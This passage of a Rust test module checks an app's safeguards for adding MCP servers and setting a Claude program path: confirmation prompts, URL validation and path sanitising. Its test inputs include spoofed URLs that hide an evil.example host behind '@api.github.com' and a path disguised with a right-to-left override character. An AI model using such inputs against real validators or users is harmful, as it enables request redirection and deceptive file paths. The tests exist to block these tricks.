            "https:///evil.example${HOMEPATH}@api.github.com/mcp",
            r"https://\evil.example${HOMEPATH}@api.github.com/mcp",
            r"https://evil.example\@api.github.com/mcp",
        ] {
            assert!(http_with(url, "x").validate().is_err(), "{url}");
        }
    }

    #[test]
    fn the_message_names_the_program() {
        assert!(claude_program_message("C:/x/claude.exe").contains("\n\nC:/x/claude.exe\n\n"));
    }

    #[test]
    fn only_debug_builds_take_the_answer_from_the_environment() {
        assert!(preconfirmed(true, Some("yes")));
        assert!(!preconfirmed(false, Some("yes")));
        assert!(!preconfirmed(true, Some("1")));
        assert!(!preconfirmed(true, None));
    }

    const PROGRAM: &str = "C:/tools/claude.exe";

    #[tokio::test]
    async fn a_declined_server_is_neither_probed_nor_stored_and_an_allowed_one_is() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        // A program that does not exist, and no accept: nothing is ever started.
        let config = stdio("dots-no-such-mcp-server", &["a"], None);
        let LibraryConfig::McpServer(server) = config.clone() else {
            unreachable!()
        };
        let mut asked = Vec::new();
        let err = probe_confirmed(&rt, server, |q| {
            asked.push(q);
            std::future::ready(false)
        })
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert_eq!(asked.len(), 1);
        assert!(asked[0].starts_with(r#"Dots will run: "dots-no-such-mcp-server" "a". Run it?"#));

        let no = |_| std::future::ready(false);
        let yes = |_| std::future::ready(true);
        let err = add_confirmed(&rt, "srv", config.clone(), None, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());

        let item = add_confirmed(&rt, "srv", config.clone(), None, yes)
            .await
            .unwrap();

        // The same command line again: no question (a refusal would stop it). Another one
        // asks, and a refusal leaves the stored config as it was.
        update_confirmed(&rt, &item.id, config.clone(), no)
            .await
            .unwrap();
        let other = stdio("dots-no-such-mcp-server", &["b"], None);
        let err = update_confirmed(&rt, &item.id, other.clone(), no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        let stored = rt.library().list().await.unwrap().remove(0).item.config;
        assert_eq!(stored, config);
        update_confirmed(&rt, &item.id, other.clone(), yes)
            .await
            .unwrap();
        let stored = rt.library().list().await.unwrap().remove(0).item.config;
        assert_eq!(stored, other);

        // A server over HTTP is not a program to run.
        add_confirmed(&rt, "web", http(), None, no).await.unwrap();
        rt.shutdown();
    }

    /// A runtime on a temporary data folder: its server on a free port, and no Claude CLI, so
    /// nothing is spawned.
    async fn runtime(dir: &tempfile::TempDir) -> Runtime {
        let mut cfg = dots_core::Config::new(dir.path().join("data"));
        cfg.port = 0;
        cfg.claude_path = Some(dir.path().join("no-claude.exe"));
        Runtime::start(cfg).await.unwrap()
    }

    /// Saves `settings` with every question answered `answer`. Returns the result and the
    /// questions that were asked.
    async fn save(
        rt: &Runtime,
        settings: Settings,
        answer: bool,
    ) -> (Result<SettingsSaved, CmdError>, Vec<String>) {
        let mut asked = Vec::new();
        let result = save_settings_confirmed(rt, settings, |message| {
            asked.push(message);
            std::future::ready(answer)
        })
        .await;
        (result, asked)
    }

    fn with_program(settings: &Settings, path: &str) -> Settings {
        Settings {
            claude_path: Some(path.into()),
            ..settings.clone()
        }
    }

    #[tokio::test]
    async fn a_declined_claude_program_is_not_saved() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        let (result, asked) = save(&rt, with_program(&before, PROGRAM), false).await;
        assert_eq!(
            result,
            Err(CmdError::cancelled("the Claude program was not changed"))
        );
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        assert!(asked[0].contains(PROGRAM));
        assert_eq!(rt.settings().await, before);
        rt.shutdown();
    }

    #[tokio::test]
    async fn an_allowed_claude_program_is_saved_as_it_was_shown() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        // The path is trimmed once: the question shows the string that is then stored.
        let typed = format!("  {PROGRAM} ");
        let (result, asked) = save(&rt, with_program(&before, &typed), true).await;
        let saved = result.unwrap();
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        assert_eq!(saved.settings.claude_path.as_deref(), Some(PROGRAM));
        assert!(saved.restart_required);
        assert_eq!(rt.settings().await, saved.settings);
        rt.shutdown();
    }

    #[tokio::test]
    async fn the_stored_program_and_a_cleared_one_are_saved_without_a_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let (result, _) = save(&rt, with_program(&rt.settings().await, PROGRAM), true).await;
        let stored = result.unwrap().settings;

        // The same program, with another setting changed. `false` would refuse it if asked.
        let more_runs = Settings {
            max_concurrent_runs: 3,
            ..stored.clone()
        };
        let (result, asked) = save(&rt, more_runs.clone(), false).await;
        assert_eq!(result.unwrap().settings, more_runs);
        assert_eq!(asked, [] as [String; 0]);

        // The same program with spaces around it is the same after trimming.
        let (result, asked) = save(
            &rt,
            with_program(&more_runs, &format!(" {PROGRAM} ")),
            false,
        )
        .await;
        assert_eq!(result.unwrap().settings, more_runs);
        assert_eq!(asked, [] as [String; 0]);

        // Cleared: back to searching PATH.
        let cleared = Settings {
            claude_path: None,
            ..more_runs
        };
        let (result, asked) = save(&rt, cleared.clone(), false).await;
        assert_eq!(result.unwrap().settings, cleared);
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await.claude_path, None);
        rt.shutdown();
    }

    #[tokio::test]
    async fn invalid_settings_are_refused_before_anything_is_asked() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        let bad = Settings {
            port: 0,
            ..with_program(&before, PROGRAM)
        };
        // `true`: the settings would be saved if the question came first.
        let (result, asked) = save(&rt, bad, true).await;
        let err = result.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(err.message, "port must be between 1 and 65535");
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await, before);
        rt.shutdown();
    }

    #[tokio::test]
    async fn a_program_path_that_would_not_show_as_it_is_never_reaches_the_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        // In a dialog this reads "C:/tools/claude.exe": the override turns the rest around.
        let disguised = "C:/tools/\u{202e}exe.edualc";
        // `true`: the path would be saved if the question came first.
        let (result, asked) = save(&rt, with_program(&before, disguised), true).await;
        let err = result.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(
            err.message,
            "claude_path must not contain invisible or text-direction characters (found U+202E \
             at character 10)"
        );
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await, before);

        // A line break inside the path is refused; one pasted after it is trimmed away.
        let (result, asked) = save(&rt, with_program(&before, "C:/tools\n/claude.exe"), true).await;
        assert_eq!(result.unwrap_err().kind, CmdErrorKind::Invalid);
        assert_eq!(asked, [] as [String; 0]);
        let (result, asked) =
            save(&rt, with_program(&before, &format!("{PROGRAM}\r\n")), true).await;
        assert_eq!(
            result.unwrap().settings.claude_path.as_deref(),
            Some(PROGRAM)
        );
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        rt.shutdown();
    }
}
